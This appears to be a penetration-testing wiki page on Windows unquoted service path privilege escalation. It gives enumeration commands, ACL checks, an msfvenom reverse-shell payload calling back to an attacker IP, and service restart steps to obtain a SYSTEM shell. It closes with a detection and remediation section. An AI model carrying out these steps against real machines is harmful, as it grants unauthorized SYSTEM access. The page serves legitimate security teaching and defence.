---
title: Unquoted service paths
slug: unquoted-service-paths
---

> **TL;DR:** A service `ImagePath` like `C:\Program Files\Vendor App\svc.exe` without quotes makes Windows attempt `C:\Program.exe`, then `C:\Program Files\Vendor.exe`, and so on — drop a binary at one of those interim paths in a writable parent directory and the service launches it as SYSTEM.

## What it is
When the Service Control Manager parses an `ImagePath` containing spaces and lacking surrounding quotes, `CreateProcess` walks the string token by token treating each space as a candidate path delimiter. If any intermediate token resolves to an executable in a writable directory, that binary runs with the service's credentials (often LocalSystem). The bug is a 1990s-era Windows oddity that persists because vendor MSI installers still produce unquoted `ImagePath` values.

## Preconditions / where it applies
- A service whose `ImagePath` contains at least one space and is not wrapped in `"..."`.
- One of the intermediate directories on the path is writable by the current user (or a group you belong to). The most useful case is `C:\Program.exe` — the root of `C:\` was historically Everyone-writable, though modern Windows restricts this. More common today is a writable subdir like `C:\Program Files\Vendor App\` itself.
- Service that auto-starts as SYSTEM, or one you can start/restart (see [[weak-service-permissions]] for SC ACL abuse).

## Technique
1. Enumerate unquoted paths with whitespace:

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

Or with PowerShell:

```powershell
Get-WmiObject win32_service | Where-Object {$_.PathName -notlike '"*' -and $_.PathName -match ' '} |
  Select Name, PathName, StartMode, StartName
```

PowerUp's `Get-ServiceUnquoted` does the same plus a writability check on each candidate path. winPEAS flags these under "Modifiable Services".

2. Check write access on candidate directories. For `C:\Program Files\Vendor App\svc.exe` the SCM will try, in order:

```
C:\Program.exe
C:\Program Files\Vendor.exe
C:\Program Files\Vendor App\svc.exe   (intended)
```

Check ACLs with `icacls "C:\Program Files\Vendor App"`. Look for `(F)` or `(M)` on `Authenticated Users`, `Users`, or your own SID.

3. Plant a payload at the first writable interim path. Name must match the truncation exactly (e.g. `Vendor.exe`):

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe-service -o Vendor.exe
```

`exe-service` is critical — a regular `exe` payload will be killed by the SCM after ~30 s for not responding to service control messages. The `exe-service` format implements the SCM handshake so the service stays in "Running" state.

4. Restart the service to trigger:

```cmd
sc stop <svc> && sc start <svc>
```

Or wait for next boot if it auto-starts. SYSTEM shell pops.

## Detection and defence
- Audit at scale with `wmic`/PowerShell one-liners above; remediate by quoting `ImagePath` in the registry: `reg add "HKLM\SYSTEM\CurrentControlSet\Services\<svc>" /v ImagePath /t REG_EXPAND_SZ /d "\"C:\Program Files\Vendor App\svc.exe\"" /f`.
- Sysmon Event ID 1 of an unexpected `.exe` spawned from `C:\` root or `C:\Program Files\<TopLevel>.exe` with parent `services.exe` is high-confidence malicious.
- Tighten ACLs on third-party service directories so non-admins cannot write executables.
- Application allow-listing (WDAC/AppLocker) on `Program Files` paths blocks unsigned binaries even when planted.
- Related: [[weak-service-permissions]], [[dll-hijacking-privesc]], [[always-install-elevated]].

## References
- [HackTricks — Services / Unquoted Service Paths](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#services) — Enumeration commands and write-target table.
- [Microsoft — CreateProcess remarks](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa#remarks) — Documents the space-parsing behaviour that causes this.
- [PowerSploit PowerUp — Get-ServiceUnquoted](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) — Automated discovery cmdlet.
- [PayloadsAllTheThings — Windows Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#unquoted-service-paths) — Complete exploitation recipe.
